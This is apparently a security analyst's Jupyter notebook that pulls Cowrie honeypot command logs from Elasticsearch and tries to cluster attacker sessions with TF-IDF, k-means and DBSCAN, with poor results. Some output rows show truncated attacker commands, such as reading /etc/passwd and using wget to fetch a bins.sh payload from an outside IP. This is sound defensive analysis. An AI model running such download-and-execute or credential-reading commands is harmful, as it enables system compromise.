# Session Clustering by Command Similarity

Goal: group attacker sessions by what they DO (command sequences) rather than where they come FROM.

idea: TF-IDF on command sequences, then k-means or DBSCAN. sarah 2026-03-19

In [1]:
import pandas as pd
import numpy as np
from elasticsearch import Elasticsearch

es = Elasticsearch(['http://ingest-elk-01:9200'])

In [2]:
def get_session_commands(days_back=14, size=10000):
    q = {
        'query': {
            'bool': {
                'must': [
                    {'term': {'eventid.keyword': 'cowrie.command.input'}},
                    {'range': {'@timestamp': {'gte': f'now-{days_back}d'}}}
                ]
            }
        },
        'size': size,
        'sort': [{'@timestamp': 'asc'}],
        '_source': ['@timestamp', 'session', 'src_ip', 'input', 'sensor']
    }
    resp = es.search(index='cowrie-*', body=q)
    return [h['_source'] for h in resp['hits']['hits']]

cmds = pd.DataFrame(get_session_commands())
print(f'Got {len(cmds):,} command events across {cmds["session"].nunique()} sessions')

Got 1,834 command events across 312 sessions


In [3]:
# group commands per session into ordered list
session_cmds = cmds.sort_values('@timestamp').groupby('session')['input'].apply(list)
session_cmds.head()

session
a]f3c2e1    [cat /etc/passwd, uname -a, wget http://45.148...
b]81d4fa    [cd /tmp, wget http://185.220.101.xx/bins.sh, ...
c]29e8b1    [cat /proc/cpuinfo, free -m, ls /tmp]
d]44ac23    [uname -a, cat /etc/issue, /bin/busybox ECCHI]
e]99f1d2    [cd /tmp, cat /proc/cpuinfo, wget http://89.24...
Name: input, dtype: object

In [4]:
# normalize commands - strip args for now, just keep the binary name
def normalize_cmd(cmd):
    """Extract just the command name, ignoring args and paths"""
    cmd = cmd.strip()
    if cmd.startswith('cd '):
        return 'cd'
    parts = cmd.split()
    if not parts:
        return ''
    binary = parts[0].split('/')[-1]  # strip path
    return binary

session_normalized = session_cmds.apply(lambda cmds: ' '.join([normalize_cmd(c) for c in cmds]))

In [5]:
from sklearn.feature_extraction.text import TfidfVectorizer

vectorizer = TfidfVectorizer(max_features=100)
X = vectorizer.fit_transform(session_normalized)
print(f'TF-IDF matrix: {X.shape}')

TF-IDF matrix: (312, 87)


### Try k-means first

In [6]:
from sklearn.cluster import KMeans, DBSCAN
from sklearn.metrics import silhouette_score

ModuleNotFoundError: No module named 'sklearn'

In [7]:
!pip install scikit-learn

In [8]:
from sklearn.cluster import KMeans, DBSCAN
from sklearn.metrics import silhouette_score

# try a few k values
for k in range(3, 9):
    km = KMeans(n_clusters=k, random_state=42, n_init=10)
    labels = km.fit_predict(X)
    sil = silhouette_score(X, labels)
    print(f'k={k}: silhouette={sil:.3f}')

k=3: silhouette=0.189
k=4: silhouette=0.203
k=5: silhouette=0.178
k=6: silhouette=0.162
k=7: silhouette=0.155
k=8: silhouette=0.141


silhouette scores are all terrible. 0.2 is basically noise

In [9]:
# try DBSCAN
for eps in [0.5, 0.7, 0.9]:
    db = DBSCAN(eps=eps, min_samples=5, metric='cosine')
    labels = db.fit_predict(X)
    n_clusters = len(set(labels)) - (1 if -1 in labels else 0)
    n_noise = (labels == -1).sum()
    print(f'DBSCAN eps={eps}: {n_clusters} clusters, {n_noise} noise points ({n_noise/len(labels)*100:.1f}%)')

DBSCAN eps=0.5: 1 clusters, 287 noise points (92.0%)
DBSCAN eps=0.7: 2 clusters, 198 noise points (63.5%)
DBSCAN eps=0.9: 1 clusters, 89 noise points (28.5%)


also bad. either everything is noise or everything is one big cluster

In [10]:
# look at what k=4 gives us anyway
km = KMeans(n_clusters=4, random_state=42, n_init=10)
labels = km.fit_predict(X)

feature_names = vectorizer.get_feature_names_out()
for i in range(4):
    center = km.cluster_centers_[i]
    top_idx = center.argsort()[-5:][::-1]
    top_terms = [feature_names[j] for j in top_idx]
    n = (labels == i).sum()
    print(f'Cluster {i}: {" ".join(top_terms)} (n={n})')

cluster
 0    cat uname wget chmod cd             (n=89)
 1    cd wget curl chmod busybox           (n=72)
 2    cat free ls uname whoami             (n=44)
 3    cd cat wget tftp busybox             (n=107)
Name: top_terms, dtype: object

clusters dont really separate well, maybe need more features. parking this for now

the problem is probably that normalizing to just binary names throws away too much. `wget http://x` and `wget http://y` look identical but are totally different campaigns. maybe should use the full command or at least domain extraction

also: most sessions are super short (3-5 cmds) so there's just not enough signal per session

In [11]:
# yeah the sessions are short
session_cmds.apply(len).describe()

count    312.000000
mean       5.878205
std        4.213889
min        1.000000
25%        3.000000
50%        5.000000
75%        7.000000
max       34.000000
Name: input, dtype: float64

In [12]:
# maybe try: sequence alignment (like bioinformatics?) instead of bag-of-words
# or just manually define categories based on behavior patterns
# 
# categories could be:
#   - downloaders (wget/curl + chmod)
#   - recon (uname, cat /etc/passwd, free)
#   - propagators (wget + scanning behavior)
#   - credential harvesters (find + grep for keys/passwords)
#
# ???

In [ ]:
# 